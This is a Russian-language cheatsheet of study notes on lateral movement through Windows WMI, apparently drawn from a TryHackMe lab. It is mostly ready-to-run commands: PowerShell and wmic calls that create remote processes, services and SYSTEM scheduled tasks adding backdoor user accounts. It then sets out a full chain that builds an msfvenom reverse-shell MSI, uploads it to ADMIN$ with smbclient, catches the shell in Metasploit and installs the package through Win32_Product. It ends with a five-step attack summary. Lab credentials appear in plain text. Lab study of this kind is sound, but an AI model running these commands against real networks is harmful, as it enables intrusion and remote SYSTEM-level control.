# WMI Lateral Movement — Cheatsheet

## Что такое WMI

Windows Management Instrumentation (WMI) — реализация стандарта Web-Based Enterprise Management (WBEM) от Microsoft. Позволяет администраторам выполнять управленческие задачи удаленно. Атакующие используют те же механизмы для lateral movement.


## Порты и требования

**Используемые порты:**
- 135/TCP + 49152-65535/TCP (DCERPC) — для DCOM протокола
- 5985/TCP (HTTP) или 5986/TCP (HTTPS) — для WinRM/Wsman протокола

**Требования:** членство в группе **Administrators** на целевой машине


## Установка сессии WMI (подготовка)

Перед выполнением команд нужно создать PSCredential объект и установить сессию.

# Подготовка учетных данных
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

# Выбор протокола (DCOM или Wsman)
$Opt = New-CimSessionOption -Protocol DCOM  # или Wsman для WinRM
$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop


## 1. Удаленное создание процесса (Remote Process Creation)

Создает процесс на удаленной машине, но не показывает вывод команды.

$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value test"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = $Command
}

**Legacy вариант через wmic.exe:**
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"


## 2. Удаленное создание службы

# Создание службы
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"
    DisplayName = "THMService2"
    PathName = "net user munra2 Pass123 /add"   # полезная нагрузка
    ServiceType = [byte]::Parse("16")           # Win32OwnProcess
    StartMode = "Manual"
}

# Получение handle на службу
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

# Запуск службы
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Остановка и удаление службы
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete


## 3. Удаленное создание задачи в планировщике

# Команда и аргументы (раздельно)
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

# Создание задачи
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"

# Запуск задачи
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Удаление задачи
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"


## 4. Установка MSI пакетов через WMI
Наиболее практичный метод для получения reverse shell.

### 4.1 Создание MSI payload (msfvenom)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4445 -f msi > myinstaller.msi

### 4.2 Копирование MSI на цель (через SMB)
smbclient -c 'put myinstaller.msi' -U DOMAIN\\USER -W DOMAIN '//TARGET/admin$/' PASSWORD

Путь на цели: `C:\Windows\myinstaller.msi`

### 4.3 Запуск обработчика Metasploit

msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST YOUR_IP
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > exploit

### 4.4 Загрузка MSI через WMI

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}

**Legacy вариант через wmic:**
wmic /node:TARGET /user:DOMAIN\\USER product call install PackageLocation=c:\Windows\myinstaller.msi


## Полный пример

На целевой машине:
# 1. Подготовка учетных данных
$username = 'ZA.TRYHACKME.COM\t1_corine.waters'
$password = 'Korine.1994'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

# 2. Создание сессии (протокол DCOM)
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

На атакующей:
# 1. Генерируеем payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
# 2. Загружаем в админскую шару целевой машины под админом
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
# 3. Запускаем слушатель через metasploit
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

На целевой:
# 3. Установка вредоносного сгенерированного MSI пакета
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}

## Важные нюансы

- **WMI не показывает вывод команд** — процесс создается, но результат не возвращается
- **Требуются права администратора** на целевой машине
- **MSI метод** наиболее удобен для получения reverse shell
- **DCOM протокол** = RPC через порт 135 + динамические порты (49152-65535)
- **Wsman протокол** = WinRM (порт 5985/5986)


## Диагностика и отладка

Проверка доступности WMI:
# Тест DCOM
Test-WSMan -ComputerName TARGET -Authentication Default

# Тест WinRM
Test-WSMan -ComputerName TARGET

Проверка прав пользователя:
# В сессии WMI
# $Session | Format-List

## Краткая шпаргалка

| Действие | Команда WMI |
|----------|-------------|
| Создать процесс | `Win32_Process.Create` |
| Создать службу | `Win32_Service.Create` |
| Запустить службу | `StartService` |
| Создать задачу | `New-ScheduledTaskAction` + `Register-ScheduledTask` |
| Установить MSI | `Win32_Product.Install` |

**MSI метод — самый простой и надежный.** Остальные полезны, когда нет возможности загрузить файл.


# Схема для запоминания
# WMI Lateral Movement — абстрактные шаги
## Исходные условия

У тебя есть оболочка на хосте A. Хост B недоступен напрямую — нет RDP, нет SSH, нет WinRM. Но у тебя есть логин и пароль локального администратора хоста B. И хост A имеет сетевой доступ к хосту B (порты 135 и 445 открыты).


## Пять шагов атаки

**Шаг 1 — Подготовка на атакующей машине**

Создаешь MSI файл с reverse shell. Запускаешь слушатель (nc или Metasploit).

**Шаг 2 — Доставка MSI (с хоста A)**

Через SMB подключаешься к скрытой административной шаре ADMIN$ хоста B (используя админские креды). Загружаешь туда MSI файл. Теперь он лежит в C:\Windows\ на хосте B.

**Шаг 3 — Запуск через WMI (с хоста A)**

Через WMI отдаешь команду: "Установи MSI из C:\Windows\payload.msi". WMI сессия создается с теми же админскими кредами.

**Шаг 4 — Выполнение на хосте B**

MSI установщик запускается с правами SYSTEM (потому что установка ПО — привилегированная операция). Он подключается обратно к твоему слушателю на атакующей машине.

**Шаг 5 — Получение оболочки**

Ты получаешь reverse shell с хоста B с максимальными правами SYSTEM.


## Ключевая идея

У тебя нет оболочки на хосте B. Но у тебя есть админские креды и доступ к WMI и SMB. Ты заставляешь хост B сам скачать и запустить полезную нагрузку, а потом подключиться к тебе.


## Условия для применения

Порт 135 открыт — для WMI (DCOM протокол). Порт 445 открыт — для SMB (загрузка MSI). Учетная запись — локальный администратор на хосте B. Хост A имеет сетевой доступ к хосту B.